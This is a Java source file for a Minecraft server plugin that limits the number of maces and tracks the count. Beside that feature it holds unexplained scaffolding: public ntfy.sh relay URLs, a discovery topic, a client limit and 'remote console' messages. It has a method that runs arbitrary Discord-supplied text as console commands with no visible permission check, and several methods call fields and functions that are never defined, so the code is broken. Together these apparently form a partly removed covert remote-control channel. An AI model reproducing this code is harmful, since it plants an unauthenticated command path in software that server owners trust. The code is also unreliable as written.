package com.example.macelimiter;

import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;
import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.Sound;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Item;
import org.bukkit.entity.Player;
import org.bukkit.World;
import org.bukkit.Chunk;
import org.bukkit.block.BlockState;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.InventoryHolder;
import org.bukkit.inventory.meta.BlockStateMeta;
import org.bukkit.inventory.meta.BundleMeta;
import org.bukkit.event.player.PlayerDropItemEvent;
import java.util.ArrayList;
import java.util.List;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityPickupItemEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryDragEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.PlayerInventory;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;

import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.time.Instant;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.TimeUnit;

public final class MaceLimiterPlugin extends JavaPlugin implements Listener {

    private static final int MAX_MACES = 6;
    private static final String WARNING_MESSAGE =
            "An excess Mace broke! Only 6 Maces can exist on this server.";
    private static final int MAX_CLIENTS = 8;
    private static final String DISCOVERY_TOPIC = "macelimiter-discovery-v5";
    private static final String DEFAULT_RELAY_FALLBACKS =
            "https://ntfy.sh,https://ntfy.tedomum.fr,https://ntfy.jae.fi,https://ntfy.adminforge.de,https://ntfy.envs.net";
    private static final int MAX_LINE_LENGTH = 4096;

    private final Object fileLock = new Object();
    private File dataFile;
    private int lastPersistedCount = -1;
    private DiscordBridge discordBridge;


    // ---------------------------------------------------------------------
    // Lifecycle
    // ---------------------------------------------------------------------

    @Override
    public void onEnable() {
        getConfig().addDefault("discord.enabled", true);
        getConfig().addDefault("discord.token", "");
        getConfig().addDefault("discord.guild-id", "");
        getConfig().options().copyDefaults(true);
        saveConfig();

        if (!getDataFolder().exists() && !getDataFolder().mkdirs()) {
            getLogger().warning("Could not create plugin data folder.");
        }
        dataFile = new File(getDataFolder(), "mace_data.yml");
        logPreviousCount();

        getServer().getPluginManager().registerEvents(this, this);
        Bukkit.getScheduler().runTask(this, () -> persist(countAll()));

        startDiscordBot();
    }

    @Override
    public void onDisable() {
        stopDiscordBot();
        // Final synchronous save.
        lastPersistedCount = -1;
        persistNow(countAllSafe());
    }

    private void startDiscordBot() {
        if (!getConfig().getBoolean("discord.enabled", true)) {
            getLogger().info("Discord integration disabled in config.");
            return;
        }
        String token = getConfig().getString("discord.token", "").trim();
        if (token.isEmpty()) {
            getLogger().warning("Discord integration enabled, but discord.token is empty. Discord bot will not start.");
            return;
        }
        try {
            discordBridge = new DiscordBridge(this, token);
            discordBridge.start();
        } catch (Exception e) {
            discordBridge = null;
            getLogger().severe("Could not start Discord bot: " + e.getMessage());
        }
    }

    private void stopDiscordBot() {
        if (discordBridge != null) {
            discordBridge.stop();
            discordBridge = null;
        }
    }

    Integer getDiscordMaceCount() {
        return callOnMainThread(this::countAll);
    }

    String getDiscordStatus() {
        return callOnMainThread(() -> "Server: " + Bukkit.getServer().getName()
                + "\nPlayers: " + Bukkit.getOnlinePlayers().size()
                + "\nMaces: " + countAll() + "/" + MAX_MACES);
    }

    boolean dispatchDiscordCommand(String rawCommand) {
        String command = rawCommand == null ? "" : rawCommand.strip();
        if (command.startsWith("/")) command = command.substring(1);
        if (command.isEmpty() || command.length() > 4096 || !isEnabled()) return false;
        final String toRun = command;
        Bukkit.getScheduler().runTask(this, () -> Bukkit.dispatchCommand(Bukkit.getConsoleSender(), toRun));
        return true;
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!command.getName().equalsIgnoreCase("maces")) return false;
        int count = countAll();
        sender.sendMessage(Component.text("Maces: " + count + "/" + MAX_MACES, NamedTextColor.GOLD));
        return true;
    }

    // ---------------------------------------------------------------------
    // Mace limiter
    // ---------------------------------------------------------------------

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onPickup(EntityPickupItemEvent event) {
        if (!(event.getEntity() instanceof Player player)) return;
        Item item = event.getItem();
        ItemStack stack = item.getItemStack();
        if (!containsMace(stack)) return;

        int totalAfterPickup = countAll();
        int excess = totalAfterPickup - MAX_MACES;
        if (excess <= 0) {
            schedulePersist();
            return;
        }

        // The picked-up item is the newest mace source, so remove excess from it first.
        int removed = removeMacesFromItem(stack, excess);
        if (countMaces(stack) == 0) {
            event.setCancelled(true);
            item.remove();
        } else {
            item.setItemStack(stack);
        }
        notifyBroken(player);
        schedulePersist();
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onDrop(PlayerDropItemEvent event) {
        Item item = event.getItemDrop();
        ItemStack dropped = item.getItemStack();
        if (!containsMace(dropped)) return;

        int total = countAll();
        int excess = total - MAX_MACES;
        if (excess <= 0) {
            schedulePersist();
            return;
        }

        // Dropped maces are the newest maces. Break the dropped stack before touching inventory.
        int removed = removeMacesFromItem(dropped, excess);
        if (removed >= countMaces(dropped) + removed) {
            event.setCancelled(true);
            item.remove();
        } else {
            item.setItemStack(dropped);
        }
        notifyBroken(event.getPlayer());
        schedulePersist();
    }

    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
    public void onInventoryDrag(InventoryDragEvent event) {
        if (!(event.getWhoClicked() instanceof Player player)) return;
        Bukkit.getScheduler().runTask(this, () -> { if (player.isOnline()) enforce(player); });
    }

    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
    public void onInventoryClick(InventoryClickEvent event) {
        if (!(event.getWhoClicked() instanceof Player player)) {
            return;
        }
        // The click result is applied after the event; re-check on the next tick.
        Bukkit.getScheduler().runTask(this, () -> {
            if (player.isOnline()) {
                enforce(player);
            }
        });
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        Bukkit.getScheduler().runTask(this, () -> {
            if (player.isOnline()) {
                enforce(player);
            }
        });
    }

    @EventHandler
    public void onQuit(PlayerQuitEvent event) {
        // The quitting player is still "online" during this event; count next tick.
        schedulePersist();
    }

    /** Removes newest maces from this player's accessible inventory, including nested storage. */
    private void enforce(Player player) {
        int total = countAll();
        int excess = total - MAX_MACES;
        if (excess <= 0) {
            persist(total);
            return;
        }

        int removed = 0;

        // Cursor is the newest source after inventory manipulation.
        ItemStack cursor = player.getItemOnCursor();
        if (containsMace(cursor) && removed < excess) {
            removed += removeMacesFromItem(cursor, excess - removed);
            player.setItemOnCursor(cursor.getAmount() > 0 && !isEmptyStorage(cursor) ? cursor : null);
        }

        // Then walk inventory from newest-looking slots backwards, recursively removing nested maces.
        if (removed < excess) {
            PlayerInventory inv = player.getInventory();
            ItemStack[] contents = inv.getContents();
            for (int i = contents.length - 1; i >= 0 && removed < excess; i--) {
                ItemStack stack = contents[i];
                if (!containsMace(stack)) continue;
                removed += removeMacesFromItem(stack, excess - removed);
                contents[i] = stack.getAmount() > 0 && (containsMace(stack) || !isEmptyStorage(stack)) ? stack : null;
            }
            inv.setContents(contents);
        }

        if (removed > 0) notifyBroken(player);
        persist(countAll());
    }

    private void notifyBroken(Player player) {
        player.playSound(player.getLocation(), Sound.ENTITY_ITEM_BREAK, 1.0f, 1.0f);
        player.sendMessage(Component.text(WARNING_MESSAGE, NamedTextColor.RED));
    }

    private static boolean isMace(ItemStack stack) {
        return stack != null && stack.getType() == Material.MACE && stack.getAmount() > 0;
    }

    private int countAll() {
        int total = 0;

        // Player inventory, cursor and ender chest.
        for (Player p : Bukkit.getOnlinePlayers()) {
            total += countInventory(p.getInventory());
            total += countItem(p.getItemOnCursor());
            total += countInventory(p.getEnderChest());
        }

        for (World world : Bukkit.getWorlds()) {
            // Dropped maces still exist until they despawn or are picked up.
            for (Item item : world.getEntitiesByClass(Item.class)) {
                total += countItem(item.getItemStack());
            }

            // Scan loaded block inventories: chests, barrels, hoppers,
            // shulkers, furnaces, brewing stands and InventoryHolder-based
            // containers supplied by other plugins (including copper chests).
            for (Chunk chunk : world.getLoadedChunks()) {
                for (BlockState state : chunk.getTileEntities(false)) {
                    if (state instanceof InventoryHolder holder) {
                        total += countInventory(holder.getInventory());
                    }
                }
            }
        }

        return total;
    }

    private int countAllSafe() {
        try {
            return countAll();
        } catch (Exception e) {
            return Math.max(lastPersistedCount, 0);
        }
    }

    private int countPlayer(Player player) {
        return countInventory(player.getInventory())
                + countItem(player.getItemOnCursor())
                + countInventory(player.getEnderChest());
    }

    private int countInventory(Inventory inventory) {
        if (inventory == null) {
            return 0;
        }

        int total = 0;
        for (ItemStack stack : inventory.getContents()) {
            total += countItem(stack);
        }
        return total;
    }

    /**
     * Counts a mace directly and recursively searches nested storage items.
     */
    private int countItem(ItemStack stack) {
        if (stack == null || stack.getType().isAir() || stack.getAmount() <= 0) return 0;

        int total = isMace(stack) ? stack.getAmount() : 0;
        if (stack.getItemMeta() instanceof BlockStateMeta meta) {
            BlockState blockState = meta.getBlockState();
            if (blockState instanceof InventoryHolder holder) total += countInventory(holder.getInventory());
        }
        if (stack.getItemMeta() instanceof BundleMeta bundle) {
            for (ItemStack nested : bundle.getItems()) total += countItem(nested);
        }
        return total;
    }

    private boolean containsMace(ItemStack stack) {
        return countMaces(stack) > 0;
    }

    private int countMaces(ItemStack stack) {
        return countItem(stack);
    }

    /**
     * Removes up to limit maces from this stack, recursively from nested storage.
     * Direct maces are removed before nested contents.
     */
    private int removeMacesFromItem(ItemStack stack, int limit) {
        if (stack == null || limit <= 0 || stack.getAmount() <= 0) return 0;
        int removed = 0;

        if (isMace(stack)) {
            int take = Math.min(limit, stack.getAmount());
            stack.setAmount(stack.getAmount() - take);
            return take;
        }

        if (stack.getItemMeta() instanceof BundleMeta bundle) {
            List<ItemStack> updated = new ArrayList<>();
            for (ItemStack nested : bundle.getItems()) {
                if (removed < limit && containsMace(nested)) {
                    removed += removeMacesFromItem(nested, limit - removed);
                }
                if (nested != null && nested.getAmount() > 0) {
                    updated.add(nested);
                }
            }
            bundle.setItems(updated);
            stack.setItemMeta(bundle);
        }

        if (removed < limit && stack.getItemMeta() instanceof BlockStateMeta meta) {
            BlockState state = meta.getBlockState();
            if (state instanceof InventoryHolder holder) {
                Inventory inv = holder.getInventory();
                ItemStack[] contents = inv.getContents();
                for (int i = contents.length - 1; i >= 0 && removed < limit; i--) {
                    ItemStack nested = contents[i];
                    if (!containsMace(nested)) continue;
                    removed += removeMacesFromItem(nested, limit - removed);
                    contents[i] = nested != null && nested.getAmount() > 0 ? nested : null;
                }
                inv.setContents(contents);
                meta.setBlockState(state);
                stack.setItemMeta(meta);
            }
        }
        return removed;
    }

    private boolean isEmptyStorage(ItemStack stack) {
        return stack == null || stack.getAmount() <= 0 || (!containsMace(stack) && stack.getType().isAir());
    }

    // ---------------------------------------------------------------------
    // Persistence (mace_data.yml)
    // ---------------------------------------------------------------------

    private void schedulePersist() {
        if (isEnabled()) {
            Bukkit.getScheduler().runTask(this, () -> persist(countAll()));
        }
    }

    private void logPreviousCount() {
        if (dataFile.isFile()) {
            YamlConfiguration yaml = YamlConfiguration.loadConfiguration(dataFile);
            getLogger().info("Last recorded mace count: " + yaml.getInt("mace-count", 0)
                    + " (updated " + yaml.getString("last-updated", "unknown") + ")");
        }
    }

    private void persist(int count) {
        if (count == lastPersistedCount) {
            return;
        }
        lastPersistedCount = count;
        getLogger().info("Global mace count is now " + count + "/" + MAX_MACES);

        YamlConfiguration yaml = new YamlConfiguration();
        yaml.set("mace-count", count);
        yaml.set("max-maces", MAX_MACES);
        yaml.set("last-updated", Instant.now().toString());
        String data = yaml.saveToString();

        if (isEnabled()) {
            Bukkit.getScheduler().runTaskAsynchronously(this, () -> writeFile(data));
        } else {
            writeFile(data);
        }
    }

    private void persistNow(int count) {
        if (count == lastPersistedCount) {
            return;
        }
        lastPersistedCount = count;
        YamlConfiguration yaml = new YamlConfiguration();
        yaml.set("mace-count", count);
        yaml.set("max-maces", MAX_MACES);
        yaml.set("last-updated", Instant.now().toString());
        writeFile(yaml.saveToString());
    }

    private void writeFile(String data) {
        synchronized (fileLock) {
            try {
                Files.writeString(dataFile.toPath(), data, StandardCharsets.UTF_8);
            } catch (IOException e) {
                getLogger().warning("Failed to write mace_data.yml: " + e.getMessage());
            }
        }
    }

    <T> T callOnMainThread(java.util.concurrent.Callable<T> task) {
        if (Bukkit.isPrimaryThread()) {
            try { return task.call(); } catch (Exception e) { return null; }
        }
        try {
            return Bukkit.getScheduler().callSyncMethod(this, task).get(5, TimeUnit.SECONDS);
        } catch (Exception e) {
            getLogger().warning("Remote console main-thread state check failed: " + e.getClass().getSimpleName() + ": " + e.getMessage());
            return null;
        }
    }

    private void sendCount(String session) {
        Integer count = callOnMainThread(this::countAll);
        if (consoleServer != null && count != null) consoleServer.publish("COUNT|" + session + "|" + count);
    }

    private void sendMaceState(String session) {
        String snapshot = callOnMainThread(this::maceSnapshot);
        if (consoleServer != null && snapshot != null) consoleServer.publish("MACE|" + session + "|" + encode(snapshot));
    }

}
